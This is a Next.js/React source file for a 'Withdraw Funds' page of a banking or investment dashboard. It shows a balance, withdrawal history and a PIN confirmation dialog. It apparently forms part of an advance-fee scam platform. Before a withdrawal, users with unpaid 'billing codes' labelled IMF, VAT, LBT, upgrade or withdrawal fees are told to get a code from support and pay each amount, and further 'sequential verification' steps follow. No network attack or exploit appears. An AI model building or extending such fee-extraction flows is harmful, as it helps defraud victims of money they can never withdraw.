"use client";

import { useState, useEffect } from "react";
import { useUser } from "@/hooks/useAuth";
import { motion } from "framer-motion";
import { Loader2, ArrowUpRight, AlertTriangle, CheckCircle2, Receipt } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Separator } from "@/components/ui/separator";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { toast } from "sonner";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL || "",
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || ""
);

interface BillingCode {
    id: string;
    code_type: string;
    code: string;
    amount: number;
    is_paid: boolean;
}

interface Withdrawal {
    id: string;
    amount: number;
    status: string;
    description: string;
    created_at: string;
}

export default function WithdrawalsPage() {
    const [loading, setLoading] = useState(true);
    const [submitting, setSubmitting] = useState(false);
    const [userId, setUserId] = useState<string | null>(null);
    const [balance, setBalance] = useState(0);
    const [withdrawals, setWithdrawals] = useState<Withdrawal[]>([]);
    const [billingCodes, setBillingCodes] = useState<BillingCode[]>([]);
    const [pinDialogOpen, setPinDialogOpen] = useState(false);
    const [pin, setPin] = useState("");
    const [success, setSuccess] = useState(false);
    const [billingCodeInput, setBillingCodeInput] = useState("");
    const [requiresBillingCode, setRequiresBillingCode] = useState(false);

    // Withdrawal form
    const [amount, setAmount] = useState("");
    const [recipientBank, setRecipientBank] = useState("");
    const [recipientAccount, setRecipientAccount] = useState("");
    const [recipientName, setRecipientName] = useState("");

    const { user: clerkUser, isLoaded } = useUser();

    useEffect(() => {
        async function fetchData() {
            if (!clerkUser?.id) return;

            try {
                const { data: userData } = await supabase
                    .from("users")
                    .select("id")
                    .eq("clerk_id", clerkUser.id)
                    .single();

                if (userData) {
                    setUserId(userData.id);

                    // Get balance
                    const { data: walletData } = await supabase
                        .from("wallets")
                        .select("balance")
                        .eq("user_id", userData.id)
                        .eq("is_primary", true)
                        .single();
                    setBalance(walletData?.balance || 0);

                    // Get withdrawals
                    const { data: withdrawalData } = await supabase
                        .from("transactions")
                        .select("*")
                        .eq("user_id", userData.id)
                        .eq("type", "withdrawal")
                        .order("created_at", { ascending: false })
                        .limit(10);
                    setWithdrawals(withdrawalData || []);

                    // Get active billing codes
                    const { data: codeData } = await supabase
                        .from("billing_codes")
                        .select("*")
                        .eq("user_id", userData.id)
                        .eq("is_active", true)
                        .eq("is_paid", false);
                    setBillingCodes(codeData || []);
                    setRequiresBillingCode((codeData || []).length > 0);
                }
            } catch (error) {
                console.error("Error fetching data:", error);
            } finally {
                setLoading(false);
            }
        }

        if (isLoaded && clerkUser) {
            fetchData();
        }
    }, [clerkUser, isLoaded]);

    const validateForm = () => {
        const withdrawAmount = parseFloat(amount);
        if (!withdrawAmount || withdrawAmount < 100) {
            toast.error("Minimum withdrawal is $100");
            return false;
        }
        if (withdrawAmount > balance) {
            toast.error("Insufficient balance");
            return false;
        }
        if (!recipientBank) {
            toast.error("Please enter bank name");
            return false;
        }
        if (!recipientAccount) {
            toast.error("Please enter account number");
            return false;
        }
        if (!recipientName) {
            toast.error("Please enter account holder name");
            return false;
        }
        return true;
    };

    const handleInitiateWithdrawal = () => {
        if (validateForm()) {
            setPinDialogOpen(true);
        }
    };

    const handleConfirmWithdrawal = async () => {
        if (pin.length !== 4) {
            toast.error("Please enter your 4-digit PIN");
            return;
        }

        if (requiresBillingCode && !billingCodeInput) {
            toast.error("Please enter your billing verification code");
            return;
        }

        if (!userId) return;

        setSubmitting(true);

        try {
            const response = await fetch("/api/user/transactions", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    type: "withdrawal",
                    amount: parseFloat(amount),
                    pin,
                    billingCode: billingCodeInput || undefined,
                    recipientName,
                    recipientAccount,
                    recipientBank,
                    description: `Withdrawal to ${recipientBank}`,
                }),
            });

            const data = await response.json();

            if (!response.ok) {
                if (data.requiresBillingCode) {
                    setRequiresBillingCode(true);
                }
                toast.error(data.error || "Failed to submit withdrawal");
                setSubmitting(false);
                return;
            }

            if (data.newBalance !== undefined) {
                setBalance(data.newBalance);
            }

            setSuccess(true);
            setPinDialogOpen(false);
            toast.success("Withdrawal request submitted!");

            setAmount("");
            setRecipientBank("");
            setRecipientAccount("");
            setRecipientName("");
            setPin("");
            setBillingCodeInput("");
            setRequiresBillingCode(false);
        } catch (error) {
            console.error("Error creating withdrawal:", error);
            toast.error("Failed to submit withdrawal");
        } finally {
            setSubmitting(false);
        }
    };

    const formatCurrency = (amount: number) => {
        return new Intl.NumberFormat("en-US", {
            style: "currency",
            currency: "USD",
        }).format(amount);
    };

    const formatDate = (dateString: string) => {
        return new Date(dateString).toLocaleDateString("en-US", {
            month: "short",
            day: "numeric",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
        });
    };

    const getStatusColor = (status: string) => {
        switch (status) {
            case "approved":
                return "bg-green-500/10 text-green-600";
            case "pending":
                return "bg-yellow-500/10 text-yellow-600";
            case "on_hold":
                return "bg-blue-500/10 text-blue-600";
            case "cancelled":
            case "failed":
                return "bg-red-500/10 text-red-600";
            default:
                return "bg-stone-100 text-stone-600";
        }
    };

    const codeTypeLabels: Record<string, string> = {
        imf: "IMF Code",
        vat: "VAT Code",
        lbt: "LBT Code",
        upgrade_fee: "Upgrade Fee",
        withdrawal_fee: "Withdrawal Fee",
    };

    if (loading || !isLoaded) {
        return (
            <div className="flex items-center justify-center py-20">
                <Loader2 className="h-8 w-8 animate-spin text-stone-400" />
            </div>
        );
    }

    // Check for unpaid billing codes
    const hasUnpaidCodes = billingCodes.length > 0;

    if (success) {
        return (
            <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center justify-center py-20"
            >
                <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
                    <CheckCircle2 className="h-10 w-10 text-green-600" />
                </div>
                <h2 className="mt-6 text-2xl font-bold text-stone-900 dark:text-stone-100">
                    Withdrawal Submitted
                </h2>
                <p className="mt-2 text-center text-stone-500 max-w-md">
                    Your withdrawal request is being processed. You will be notified once approved.
                </p>
                <Button className="mt-6" onClick={() => setSuccess(false)}>
                    Make Another Withdrawal
                </Button>
            </motion.div>
        );
    }

    return (
        <div className="space-y-8">
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
            >
                <h1 className="text-2xl font-bold text-stone-900 dark:text-stone-100">
                    Withdraw Funds
                </h1>
                <p className="text-stone-600 dark:text-stone-400">
                    Withdraw money to your bank account
                </p>
            </motion.div>

            {/* Balance */}
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.1 }}
            >
                <Card className="bg-stone-900 text-white dark:bg-stone-100 dark:text-stone-900">
                    <CardContent className="py-6">
                        <p className="text-sm text-stone-300 dark:text-stone-600">Available Balance</p>
                        <p className="text-3xl font-bold mt-1">{formatCurrency(balance)}</p>
                    </CardContent>
                </Card>
            </motion.div>

            {/* Billing Codes Alert */}
            {hasUnpaidCodes && (
                <motion.div
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.15 }}
                >
                    <Card className="border-amber-500/50 bg-gradient-to-br from-amber-50 to-orange-50 dark:from-amber-900/20 dark:to-orange-900/20">
                        <CardHeader className="pb-3">
                            <CardTitle className="flex items-center gap-2 text-amber-700 dark:text-amber-400">
                                <AlertTriangle className="h-5 w-5" />
                                Verification Required
                            </CardTitle>
                            <CardDescription className="text-amber-600/80 dark:text-amber-500/80">
                                Your account requires {billingCodes.length > 1 ? "sequential verification" : "verification"} before proceeding with withdrawals
                            </CardDescription>
                        </CardHeader>
                        <CardContent className="pt-0">
                            <div className="space-y-2">
                                <div
                                    className="flex items-center justify-between rounded-lg bg-white/80 dark:bg-stone-900/50 p-4 border border-amber-200/50 dark:border-amber-700/30"
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="h-10 w-10 rounded-full bg-amber-100 dark:bg-amber-800/30 flex items-center justify-center">
                                            <Receipt className="h-5 w-5 text-amber-600 dark:text-amber-400" />
                                        </div>
                                        <div>
                                            <p className="font-medium text-stone-900 dark:text-stone-100">
                                                {codeTypeLabels[billingCodes[0].code_type] || billingCodes[0].code_type.toUpperCase()}
                                                {billingCodes.length > 1 && <span className="ml-2 text-[10px] text-amber-600 font-bold tracking-tight">(Step 1 of {billingCodes.length})</span>}
                                            </p>
                                            <p className="text-xs text-stone-500 dark:text-stone-400">
                                                Contact support for your verification code
                                            </p>
                                        </div>
                                    </div>
                                    <div className="text-right">
                                        <p className="font-bold text-lg text-stone-900 dark:text-stone-100">
                                            {formatCurrency(billingCodes[0].amount)}
                                        </p>
                                        <Badge variant="secondary" className="text-xs bg-amber-100 text-amber-700 dark:bg-amber-800/30 dark:text-amber-400">
                                            Current Step
                                        </Badge>
                                    </div>
                                </div>
                            </div>
                            <Separator className="my-4 bg-amber-200/50" />
                            <div className="flex items-start gap-3 text-sm text-amber-700 dark:text-amber-400">
                                <div className="min-w-0">
                                    <p className="font-medium">How to proceed:</p>
                                    <ol className="mt-1 list-decimal list-inside space-y-1 text-amber-600/80 dark:text-amber-500/80">
                                        <li>Receive your {codeTypeLabels[billingCodes[0].code_type] || "verification"} code from support</li>
                                        <li>Make payment of {formatCurrency(billingCodes[0].amount)}</li>
                                        <li>Enter the code in the withdrawal confirmation dialog</li>
                                        {billingCodes.length > 1 && <li>Complete the subsequent verification steps as they appear</li>}
                                    </ol>
                                </div>
                            </div>
                        </CardContent>
                    </Card>
                </motion.div>
            )}

            {/* Withdrawal Form */}
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.2 }}
            >
                <Card>
                    <CardHeader>
                        <CardTitle>Withdrawal Details</CardTitle>
                        <CardDescription>Enter your bank details to receive funds</CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-4">
                        <div className="space-y-2">
                            <Label>Amount (USD) *</Label>
                            <Input
                                type="number"
                                placeholder="1000"
                                value={amount}
                                onChange={(e) => setAmount(e.target.value)}
                                min="100"
                                max={balance}
                            />
                            <p className="text-xs text-stone-500">Minimum: $100</p>
                        </div>
                        <div className="space-y-2">
                            <Label>Bank Name *</Label>
                            <Input
                                placeholder="Bank of America"
                                value={recipientBank}
                                onChange={(e) => setRecipientBank(e.target.value)}
                            />
                        </div>
                        <div className="space-y-2">
                            <Label>Account Number *</Label>
                            <Input
                                placeholder="1234567890"
                                value={recipientAccount}
                                onChange={(e) => setRecipientAccount(e.target.value)}
                            />
                        </div>
                        <div className="space-y-2">
                            <Label>Account Holder Name *</Label>
                            <Input
                                placeholder="John Doe"
                                value={recipientName}
                                onChange={(e) => setRecipientName(e.target.value)}
                            />
                        </div>

                        <Button
                            className="w-full"
                            size="lg"
                            onClick={handleInitiateWithdrawal}
                            disabled={!amount || parseFloat(amount) < 100}
                        >
                            <ArrowUpRight className="mr-2 h-4 w-4" />
                            Request Withdrawal
                        </Button>
                    </CardContent>
                </Card>
            </motion.div>

            {/* Withdrawal History */}
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
            >
                <Card>
                    <CardHeader>
                        <CardTitle>Withdrawal History</CardTitle>
                    </CardHeader>
                    <CardContent>
                        {withdrawals.length === 0 ? (
                            <p className="py-8 text-center text-stone-500">
                                No withdrawals yet
                            </p>
                        ) : (
                            <div className="space-y-4">
                                {withdrawals.map((w, index) => (
                                    <div key={w.id}>
                                        <div className="flex items-center justify-between">
                                            <div>
                                                <p className="font-medium text-stone-900 dark:text-stone-100">
                                                    {w.description || "Withdrawal"}
                                                </p>
                                                <p className="text-sm text-stone-500">
                                                    {formatDate(w.created_at)}
                                                </p>
                                            </div>
                                            <div className="text-right">
                                                <p className="font-semibold text-stone-900 dark:text-stone-100">
                                                    {formatCurrency(w.amount)}
                                                </p>
                                                <Badge className={getStatusColor(w.status)}>
                                                    {w.status}
                                                </Badge>
                                            </div>
                                        </div>
                                        {index < withdrawals.length - 1 && <Separator className="mt-4" />}
                                    </div>
                                ))}
                            </div>
                        )}
                    </CardContent>
                </Card>
            </motion.div>

            {/* PIN Dialog */}
            <Dialog open={pinDialogOpen} onOpenChange={setPinDialogOpen}>
                <DialogContent>
                    <DialogHeader>
                        <DialogTitle>Confirm Withdrawal</DialogTitle>
                        <DialogDescription>
                            Enter your transaction PIN{requiresBillingCode ? " and billing verification code" : ""}
                        </DialogDescription>
                    </DialogHeader>
                    <div className="space-y-4 py-4">
                        <div className="rounded-lg bg-stone-50 p-4 dark:bg-stone-900">
                            <div className="flex justify-between text-sm">
                                <span className="text-stone-500">Amount:</span>
                                <span className="font-bold text-stone-900 dark:text-stone-100">
                                    {formatCurrency(parseFloat(amount) || 0)}
                                </span>
                            </div>
                        </div>

                        <div className="space-y-2">
                            <Label>Transaction PIN</Label>
                            <Input
                                type="password"
                                placeholder="••••"
                                value={pin}
                                onChange={(e) => setPin(e.target.value.slice(0, 4))}
                                maxLength={4}
                                className="text-center text-2xl tracking-widest"
                            />
                        </div>

                        {/* Billing Code Field - Shows when active codes exist */}
                        {requiresBillingCode && billingCodes.length > 0 && (
                            <div className="space-y-3 p-3 rounded-lg bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800">
                                <div className="flex items-center justify-between">
                                    <Label className="flex items-center gap-2 text-amber-700 dark:text-amber-400">
                                        Verification Code
                                        {billingCodes.length > 1 && (
                                            <Badge variant="destructive" className="text-[10px]">
                                                Step 1 of {billingCodes.length}
                                            </Badge>
                                        )}
                                    </Label>
                                </div>
                                <Input
                                    type="text"
                                    placeholder={`Enter ${codeTypeLabels[billingCodes[0].code_type] || "verification"} code`}
                                    value={billingCodeInput}
                                    onChange={(e) => setBillingCodeInput(e.target.value.toUpperCase())}
                                    className="text-center font-mono tracking-wider"
                                />
                                <div className="text-xs text-amber-600 dark:text-amber-500 space-y-1">
                                    <p className="font-medium">Current requirement:</p>
                                    <div className="flex justify-between items-center bg-white/50 dark:bg-stone-900/30 p-2 rounded border border-amber-200/50">
                                        <span>{codeTypeLabels[billingCodes[0].code_type] || billingCodes[0].code_type.toUpperCase()}</span>
                                        <span className="font-bold">{formatCurrency(billingCodes[0].amount)}</span>
                                    </div>
                                    {billingCodes.length > 1 && (
                                        <p className="mt-2 italic text-[10px] opacity-70">
                                            Additional verification steps will follow after this code is verified.
                                        </p>
                                    )}
                                </div>
                            </div>
                        )}

                        <Button
                            className="w-full"
                            onClick={handleConfirmWithdrawal}
                            disabled={submitting || pin.length !== 4 || (requiresBillingCode && !billingCodeInput)}
                        >
                            {submitting ? (
                                <>
                                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                                    Processing...
                                </>
                            ) : (
                                "Confirm Withdrawal"
                            )}
                        </Button>
                    </div>
                </DialogContent>
            </Dialog>
        </div >
    );
}
